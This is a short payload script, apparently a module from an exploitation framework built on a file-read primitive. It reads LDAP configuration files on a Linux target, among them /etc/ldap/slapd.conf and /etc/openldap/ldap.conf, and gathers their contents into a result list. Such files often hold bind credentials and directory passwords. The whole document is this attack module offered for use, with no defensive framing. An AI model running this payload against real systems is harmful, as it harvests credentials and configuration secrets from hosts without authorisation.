#REQUIRE_LINUX
#This payload shows LDAP configuration files
result = []
files = []

files.append('/etc/ldap/slapd.conf')
files.append('/etc/openldap/slapd.conf')
files.append('/etc/openldap/ldap.conf')
files.append('/etc/ldap/myslapd.conf')
files.append('/etc/ldap/lapd.conf')

for file in files:
    if read(file) != '':
        result.append('-------------------------')
        result.append('FILE => '+file)
        result.append(read(file))

result = [p for p in result if p != '']
